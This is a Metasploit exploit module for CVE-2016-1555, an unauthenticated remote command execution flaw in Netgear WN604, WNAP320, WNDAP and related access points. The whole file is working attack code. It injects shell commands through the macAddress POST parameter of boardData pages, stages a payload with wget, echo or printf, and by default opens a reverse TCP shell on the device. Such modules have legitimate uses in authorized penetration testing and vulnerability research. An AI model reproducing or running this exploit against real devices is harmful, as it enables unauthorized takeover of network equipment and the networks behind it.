# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Netgear Devices Unauthenticated Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php,
        (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in
        Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350,
        WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute
        arbitrary commands.
      },
      &#039;Author&#039;      =>
        [
          &#039;Daming Dominic Chen <ddchen[at]cs.cmu.edu>&#039;, # Vuln discovery
          &#039;Imran Dawoodjee <imrandawoodjee.infosec[at]gmail.com>&#039; # MSF module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2016-1555&#039;],
          [&#039;URL&#039;, &#039;https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic&#039;],
          [&#039;PACKETSTORM&#039;, &#039;135956&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2016/Feb/112&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 25 2016&#039;, # According to http://seclists.org/fulldisclosure/2016/Feb/112
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => ARCH_MIPSBE,
      &#039;Payload&#039;        => {},
      &#039;DefaultOptions&#039; => {
        &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;,
        &#039;PAYLOAD&#039;           => &#039;linux/mipsbe/shell_reverse_tcp&#039;,
        &#039;WfsDelay&#039;          => 10 },
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, { }]],
      &#039;CmdStagerFlavor&#039;=> %w{ echo printf wget },
      &#039;DefaultTarget&#039;  => 0
      ))
      register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path of the vulnerable URI.&#039;, &#039;/boardDataWW.php&#039;]), # boardDataWW.php
        OptString.new(&#039;MAC_ADDRESS&#039;, [true, &#039;MAC address to use (default: random)&#039;, Rex::Text.rand_text_hex(12)])
      ])
  end

  # check for vulnerability existence
  def check
    res = execute_command("echo #{fingerprint}") # the raw POST response

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.code == 200
      return CheckCode::Safe
    end

    unless res.get_html_document.at(&#039;input&#039;).to_s.include? fingerprint
      return CheckCode::Safe
    end

    CheckCode::Vulnerable
  end

  # execute a command, or simply send a POST request
  def execute_command(cmd, opts = {})
    vars_post = {
      &#039;macAddress&#039; => "#{datastore[&#039;MAC_ADDRESS&#039;]};#{cmd};",
      &#039;reginfo&#039; => &#039;1&#039;,
      &#039;writeData&#039; => &#039;Submit&#039;
    }

    send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;headers&#039; => { &#039;Connection&#039; => &#039;Keep-Alive&#039; },
      &#039;uri&#039;     => normalize_uri(target_uri.path),
      &#039;vars_post&#039; => vars_post
    })
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the target!")
  end

  # the exploit method
  def exploit
    #run a check before attempting to exploit
    unless [CheckCode::Vulnerable].include? check
      fail_with Failure::NotVulnerable, &#039;Target is most likely not vulnerable!&#039;
    end

    execute_cmdstager(linemax: 2048) # maximum 130,000
  end

end

